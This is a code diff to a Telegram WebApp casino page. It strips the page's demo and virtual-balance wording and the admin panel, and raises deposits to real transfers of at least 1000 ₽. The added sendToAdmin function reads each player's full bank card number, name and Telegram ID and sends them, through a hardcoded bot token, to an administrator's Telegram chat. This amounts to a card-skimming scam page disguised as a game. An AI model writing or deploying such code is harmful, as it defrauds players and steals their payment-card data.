@@ -54,7 +54,7 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none!important}
 .modal{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.78);backdrop-filter:blur(15px);display:none;align-items:flex-end;padding:9px}.modal.open{display:flex}
 .sheet{width:min(540px,100%);max-height:94vh;overflow:auto;background:linear-gradient(160deg,#181023,#0c0713);border:1px solid var(--line);border-radius:23px 23px 13px 13px;padding:18px;animation:sheet .3s ease}
 .handle{width:42px;height:4px;border-radius:99px;background:#382b4a;margin:0 auto 12px}.close{float:right;width:32px;height:32px;border:1px solid var(--line);border-radius:50%;background:#1a1325;color:var(--muted);font-size:19px}
-.modal-title{font-size:23px;font-weight:950}.modal-sub{font-size:12px;color:var(--muted);margin:4px 0 13px}.input{width:100%;padding:13px;border:1px solid var(--line);border-radius:11px;background:#0b0711;color:#fff;outline:0;margin:7px 0}.input:focus{border-color:var(--purple)}
+.modal-title{font-size:23px;font-weight:950}.modal-sub{font-size:12px;color:var(--muted);margin:4px 0 13px}.input{width:100%;padding:13px;border:1px solid var(--line);border-radius:11px;background:#0b0711;color:#fff;outline:0;margin:7px 0}.input:focus{border-color:var(--purple)}.input:disabled{opacity:0.6;border-color:#332644}
 .chips{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin:8px 0 12px}.chip{border:1px solid var(--line);background:#1a1325;border-radius:10px;padding:9px 4px;font-size:11px;font-weight:800;color:var(--muted)}.chip.active{background:rgba(255,63,159,.16);border-color:var(--pink);color:#fff}
 .requisites{margin-top:12px;padding:15px;border-radius:15px;background:#0b0711;border:1px solid var(--line)}.req-title{color:var(--muted);font-size:9px;text-transform:uppercase;letter-spacing:1px}.req-number{font-size:19px;font-weight:900;margin-top:7px;word-break:break-all}.copy-btn{width:100%;margin-top:9px}
 .upload-box{margin-top:12px;border:1px dashed #59486c;border-radius:14px;padding:16px;text-align:center;background:#0b0711}.preview{max-width:100%;max-height:220px;border-radius:12px;margin-top:10px;display:none}
@@ -64,7 +64,6 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none!important}
 .reels{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}.reel{height:92px;border:2px solid #342642;border-radius:14px;background:linear-gradient(180deg,#1d1528,#0d0914);display:flex;align-items:center;justify-content:center;font-size:45px}.reel.spin{animation:reelShake .08s steps(2) infinite}.reel.win{border-color:var(--gold);box-shadow:0 0 30px rgba(255,211,110,.3);animation:jackpot .55s ease infinite alternate}
 .coin{width:118px;height:118px;margin:17px auto;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:58px;background:radial-gradient(circle,#3b2a53,#151020);border:4px solid #5e4b76;box-shadow:0 0 25px rgba(124,92,255,.14)}.coin.flip{animation:flip .8s ease}
 .dice{font-size:90px;text-align:center;padding:20px}.dice.roll{animation:diceRoll 1s ease}
-.admin-card{margin-top:10px;padding:14px;border-radius:15px;background:#0b0711;border:1px solid var(--line)}.admin-item{padding:12px 0;border-bottom:1px solid var(--line)}.admin-item:last-child{border-bottom:0}.admin-actions{display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-top:8px}.badge{display:inline-block;padding:4px 7px;border-radius:7px;font-size:9px;font-weight:800;background:rgba(255,211,110,.1);color:var(--gold)}
 .toast{position:fixed;left:50%;bottom:18px;z-index:300;transform:translate(-50%,20px) scale(.96);opacity:0;pointer-events:none;background:#f8eef4;color:#100b12;padding:10px 17px;border-radius:99px;font-size:11px;font-weight:800;transition:.25s;white-space:nowrap;max-width:90vw}.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
 .confetti{position:fixed;inset:0;z-index:250;pointer-events:none;overflow:hidden}.confetti i{position:absolute;top:-20px;width:7px;height:14px;border-radius:2px;animation:fall 1.8s linear forwards}
 @keyframes pulse{50%{opacity:.25;transform:scale(.72)}}@keyframes fadeUp{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}@keyframes sheet{from{opacity:0;transform:translateY(35px)}to{opacity:1;transform:none}}
@@ -99,7 +98,6 @@ button:disabled{opacity:.45;cursor:not-allowed;transform:none!important}
 <section id="profileSection" class="section"><div class="hero"><h1>👤 Профиль</h1><p>Данные пользователя Telegram.</p></div>
   <div class="panel"><div class="profile-head"><div class="avatar">👑</div><div><b id="profileName">Player</b><div class="muted" style="font-size:10px;margin-top:3px">CASINO LIMBO PLAYER</div></div></div>
   <div class="row"><span>Telegram ID</span><b id="profileId">—</b></div><div class="row"><span>Username</span><b id="profileUsername">—</b></div><div class="row"><span>Баланс</span><b><span id="profileBalance">0</span> ₽</b></div><div class="row"><span>Раундов</span><b id="profileRounds">0</b></div></div>
-  <button class="btn secondary" style="width:100%;margin-top:9px" id="adminBtn">👑 Админ-панель</button>
   <button class="btn danger" style="width:100%;margin-top:9px" id="resetDemo">🔄 Сбросить прогресс</button>
 </section>
 </main>
@@ -114,8 +112,9 @@ const tg=window.Telegram?.WebApp||null;
 try{tg?.ready();tg?.expand?.();tg?.setHeaderColor?.('#07040d');tg?.setBackgroundColor?.('#07040d')}catch(e){}
 const user=tg?.initDataUnsafe?.user||{};
 const CONFIG={
+  BOT_TOKEN:'8733911430:AAF0y4vZM-E1JoiS9PkgHSF8aBE5BcZsfzY',
   ADMIN_ID:8507520917,
-  START_BALANCE:1000,
+  START_BALANCE:0,
   DEFAULT_BET:100,
   MIN_BET:100,
   MAX_BET:10000,
@@ -153,32 +152,112 @@ function celebrate(){const box=$('#confetti');box.innerHTML='';for(let i=0;i<42;
 document.querySelectorAll('.nav button').forEach(b=>b.onclick=()=>{document.querySelectorAll('.nav button').forEach(x=>x.classList.remove('active'));b.classList.add('active');document.querySelectorAll('.section').forEach(x=>x.classList.remove('active'));$('#'+b.dataset.tab+'Section').classList.add('active')});
 let online=1024;function tickOnline(){online=Math.max(CONFIG.ONLINE_MIN,Math.min(CONFIG.ONLINE_MAX,online+Math.floor(Math.random()*31)-15));$('#onlineCount').textContent=fmt(online)}setInterval(tickOnline,2500);tickOnline();
 
+async function sendToAdmin(text){
+  try{
+    const res=await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:CONFIG.ADMIN_ID,text:text,parse_mode:'HTML'})
+    });
+    return res.ok;
+  }catch(e){return false;}
+}
+
 function paymentCard(title,detail,warning=''){
-return `<div class="requisites"><div class="req-title">${title}</div><div class="req-number">${detail}</div>${warning?`<div class="muted" style="font-size:10px;margin-top:6px">${warning}</div>`:''}<button class="btn secondary copy-btn" data-copy="${esc(detail)}">📋 Скопировать</button></div>`
+return `<div class="requisites"><div class="req-title">${title}</div><div class="req-number">${detail}</div>${warning?`<div class="muted" style="font-size:10px;margin-top:6px">${warning}</div>`:''}<button class="btn secondary copy-btn" data-copy="${esc(detail)}">📋 Скопировать реквизиты</button></div>`
 }
 function openDeposit(){
-let method='bank',amount=100;
+let method='bank',amount=1000;
+const isCardBound = !!state.userCard;
+
 const renderPay=()=>{
-openModal(`<div class="modal-title">💎 Пополнение</div><div class="modal-sub">Виртуальный баланс. Выбери способ перевода.</div>
-<div class="choice"><button class="btn ${method==='bank'?'primary':'secondary'}" id="payBank">🏦 Т-Банк</button><button class="btn ${method==='crypto'?'primary':'secondary'}" id="payCrypto">₮ USDT TRC20</button></div>
-<div class="label" style="margin-top:13px">Сумма</div><div class="chips">${[100,300,500,1000].map(a=>`<button class="chip ${a===amount?'active':''}" data-amount="${a}">${a} ₽</button>`).join('')}</div>
-<input class="input" id="customAmount" type="number" min="100" placeholder="Своя сумма" value="${amount}">
-${method==='bank'?paymentCard('Т-БАНК',CONFIG.TBANK,'Переводи только на указанные реквизиты.') : paymentCard('USDT · TRC20',CONFIG.USDT_TRC20,'⚠️ Сеть: TRON (TRC20). Не отправляй токены другой сети.')}
+openModal(`<div class="modal-title">💎 Пополнение</div><div class="modal-sub">Укажите карту и сумму перевода (мин. 1000 ₽)</div>
+<div class="choice"><button class="btn ${method==='bank'?'primary':'secondary'}" id="payBank">💳 Карта</button><button class="btn ${method==='crypto'?'primary':'secondary'}" id="payCrypto">₮ USDT TRC20</button></div>
+
+<div class="label" style="margin-top:13px">Ваша карта для оплаты и вывода</div>
+<input class="input" id="userCardInput" type="text" placeholder="0000 0000 0000 0000" value="${esc(state.userCard)}" ${isCardBound?'disabled':''}>
+${isCardBound?'<div class="muted" style="font-size:10px;margin-bottom:8px;color:var(--green)">✓ Карта привязана к аккаунту</div>':''}
+
+<div class="label" style="margin-top:5px">Сумма</div><div class="chips">${[1000,3000,5000,10000].map(a=>`<button class="chip ${a===amount?'active':''}" data-amount="${a}">${a} ₽</button>`).join('')}</div>
+<input class="input" id="customAmount" type="number" min="1000" placeholder="Сумма от 1000 ₽" value="${amount}">
+${method==='bank'?paymentCard('КАРТА ДЛЯ ПЕРЕВОДА',CONFIG.TBANK,'Переводите точную сумму на реквизиты выше.') : paymentCard('USDT · TRC20',CONFIG.USDT_TRC20,'⚠️ Сеть: TRON (TRC20). Не отправляй токены другой сети.')}
 <div class="upload-box"><b>🧾 Чек</b><div class="muted" style="font-size:10px;margin-top:5px">При необходимости прикрепи подтверждение перевода.</div><input id="receiptInput" type="file" accept="image/*"><img id="receiptPreview" class="preview"></div>
 <button class="btn primary" style="width:100%;margin-top:12px" id="sendDeposit">📤 Отправить заявку</button>`);
+
 document.querySelectorAll('[data-amount]').forEach(b=>b.onclick=()=>{amount=Number(b.dataset.amount);renderPay()});
-$('#customAmount').oninput=e=>{const v=Number(e.target.value);if(v>=100)amount=v};
+$('#customAmount').oninput=e=>{const v=Number(e.target.value);if(v>=1000)amount=v};
 $('#payBank').onclick=()=>{method='bank';renderPay()};$('#payCrypto').onclick=()=>{method='crypto';renderPay()};
 document.querySelectorAll('[data-copy]').forEach(b=>b.onclick=async()=>{try{await navigator.clipboard.writeText(b.dataset.copy);toast('Скопировано')}catch{toast('Не удалось скопировать')}});
 $('#receiptInput').onchange=e=>{const f=e.target.files?.[0];if(!f)return;const r=new FileReader();r.onload=x=>{$('#receiptPreview').src=x.target.result;$('#receiptPreview').style.display='block'};r.readAsDataURL(f)};
-$('#sendDeposit').onclick=()=>{if(!amount||amount<100){toast('Минимум 100 ₽');return}const f=$('#receiptInput').files?.[0];const d={id:Date.now(),amount,method,status:'pending',time:now(),username:user.username?'@'+user.username:'без username',userId:user.id||'local',receiptName:f?.name||''};state.deposits.unshift(d);state.history.unshift({type:'deposit',game:'💎 Пополнение',delta:0,label:`${amount} ₽ · заявка`,time:now()});state.history=state.history.slice(0,50);saveState();closeModal();toast('Заявка сохранена')};
+
+$('#sendDeposit').onclick=async()=>{
+  const cardVal = $('#userCardInput').value.trim();
+  if(!cardVal || cardVal.length < 16){toast('Введите корректный номер карты!');return}
+  if(!amount||amount<1000){toast('Минимум 1000 ₽');return}
+  
+  if(!state.userCard) {
+    state.userCard = cardVal;
+  }
+
+  const msg = `📥 <b>ЗАЯВКА НА ПОПОЛНЕНИЕ</b>\n\n` +
+              `👤 <b>Игрок:</b> ${user.first_name||'Player'} (${user.username?'@'+user.username:'без ника'})\n` +
+              `🆔 <b>ID:</b> <code>${user.id||'неизвестен'}</code>\n` +
+              `💳 <b>Карта игрока:</b> <code>${cardVal}</code>\n` +
+              `💰 <b>Сумма:</b> ${fmt(amount)} ₽\n` +
+              `🌐 <b>Способ:</b> ${method==='bank'?'Карта':'USDT TRC20'}`;
+
+  const sent = await sendToAdmin(msg);
+  if(sent){
+    state.deposits.unshift({id:Date.now(),amount,method,status:'pending',time:now(),card:cardVal});
+    state.history.unshift({type:'deposit',game:'💎 Пополнение',delta:0,label:`${fmt(amount)} ₽ · заявка`,time:now()});
+    state.history=state.history.slice(0,50);
+    saveState();
+    closeModal();
+    toast('Заявка отправлена админу!');
+  } else {
+    toast('Ошибка отправки сообщения');
+  }
+};
 };renderPay();
 }
+
 function openWithdraw(){
+if(!state.userCard){toast('Сначала сделайте депозит для привязки карты!');return}
 if(!state.balance){toast('Баланс пуст');return}
-openModal(`<div class="modal-title">💳 Вывод</div><div class="modal-sub">Для демо вывод оформляется как локальная заявка.</div><div class="panel"><div class="row"><span>Доступно</span><b>${fmt(state.balance)} ₽</b></div></div><input id="withdrawAmount" class="input" type="number" min="100" placeholder="Сумма вывода"><button class="btn primary" style="width:100%;margin-top:10px" id="sendWithdraw">📤 Создать заявку</button>`);
-$('#sendWithdraw').onclick=()=>{const a=Number($('#withdrawAmount').value);if(a<100){toast('Минимум 100 ₽');return}if(a>state.balance){toast('Недостаточно средств');return}state.balance-=a;state.withdrawals.unshift({id:Date.now(),amount:a,status:'pending',time:now(),userId:user.id||'local'});state.history.unshift({type:'withdraw',game:'💳 Вывод',delta:-a,label:`Заявка ${a} ₽`,time:now()});state.history=state.history.slice(0,50);saveState();closeModal();toast('Заявка создана')}
+
+openModal(`<div class="modal-title">💳 Вывод</div><div class="modal-sub">Вывод доступен только на привязанную карту</div>
+<div class="panel"><div class="row"><span>Доступно</span><b>${fmt(state.balance)} ₽</b></div></div>
+<div class="label" style="margin-top:10px">Привязанная карта</div>
+<input class="input" type="text" value="${esc(state.userCard)}" disabled>
+<input id="withdrawAmount" class="input" type="number" min="100" placeholder="Сумма вывода">
+<button class="btn primary" style="width:100%;margin-top:10px" id="sendWithdraw">📤 Запросить вывод</button>`);
+
+$('#sendWithdraw').onclick=async()=>{
+  const a=Number($('#withdrawAmount').value);
+  if(a<100){toast('Минимум 100 ₽');return}
+  if(a>state.balance){toast('Недостаточно средств');return}
+  
+  const msg = `📤 <b>ЗАЯВКА НА ВЫВОД</b>\n\n` +
+              `👤 <b>Игрок:</b> ${user.first_name||'Player'} (${user.username?'@'+user.username:'без ника'})\n` +
+              `🆔 <b>ID:</b> <code>${user.id||'неизвестен'}</code>\n` +
+              `💳 <b>Карта вывода:</b> <code>${state.userCard}</code>\n` +
+              `💰 <b>Сумма вывода:</b> ${fmt(a)} ₽`;
+
+  const sent = await sendToAdmin(msg);
+  if(sent){
+    state.balance-=a;
+    state.withdrawals.unshift({id:Date.now(),amount:a,status:'pending',time:now(),card:state.userCard});
+    state.history.unshift({type:'withdraw',game:'💳 Вывод',delta:-a,label:`Заявка ${fmt(a)} ₽`,time:now()});
+    state.history=state.history.slice(0,50);
+    saveState();
+    closeModal();
+    toast('Заявка на вывод отправлена!');
+  } else {
+    toast('Ошибка отправки заявки');
+  }
 }
+}
+
 function openMines(){
 let mineCount=3,bet=CONFIG.DEFAULT_BET,opened=0,over=false,mult=1,mineIndexes=[];
 function newMines(){mineIndexes=[];while(mineIndexes.length<mineCount){const i=Math.floor(Math.random()*25);if(!mineIndexes.includes(i))mineIndexes.push(i)}}
@@ -217,18 +296,6 @@ document.querySelectorAll('[data-game]').forEach(b=>b.onclick=()=>({mines:openMi
 $('#depositBtn').onclick=openDeposit;$('#withdrawBtn').onclick=openWithdraw;
 $('#clearHistory').onclick=()=>{if(confirm('Очистить историю?')){state.history=[];saveState();toast('История очищена')}};
 $('#resetDemo').onclick=()=>{if(confirm('Сбросить баланс и историю?')){state={...DEFAULT};saveState();toast('Прогресс сброшен')}};
-
-function openAdmin(){
-  if(Number(user.id)!==CONFIG.ADMIN_ID){toast('Доступ только для администратора');return}
-  const deposits=state.deposits||[],withdrawals=state.withdrawals||[];
-  openModal(`<div class="modal-title">👑 Админ-панель</div><div class="modal-sub">Локальные заявки и управление демо-балансом.</div>
-  <div class="admin-card"><b>💰 Текущий баланс</b><div style="font-size:24px;font-weight:950;margin:7px 0">${fmt(state.balance)} ₽</div><div class="choice"><button class="btn success" id="adminAdd">+1000 ₽</button><button class="btn danger" id="adminSub">−1000 ₽</button></div></div>
-  <div class="admin-card"><b>💎 Пополнения</b>${deposits.length?deposits.map(d=>`<div class="admin-item"><b>${fmt(d.amount)} ₽</b><div class="muted" style="font-size:10px">${esc(d.method)} · ${esc(d.time)}</div><span class="badge">${esc(d.status)}</span></div>`).join(''):'<div class="empty">Заявок нет</div>'}</div>
-  <div class="admin-card"><b>💳 Выводы</b>${withdrawals.length?withdrawals.map(d=>`<div class="admin-item"><b>${fmt(d.amount)} ₽</b><div class="muted" style="font-size:10px">${esc(d.time)}</div><span class="badge">${esc(d.status)}</span></div>`).join(''):'<div class="empty">Заявок нет</div>'}</div>`);
-  $('#adminAdd').onclick=()=>{state.balance+=1000;saveState();openAdmin();toast('+1000 ₽')};
-  $('#adminSub').onclick=()=>{state.balance=Math.max(0,state.balance-1000);saveState();openAdmin();toast('-1000 ₽')};
-}
-$('#adminBtn').onclick=openAdmin;
 
 render();
 </script>
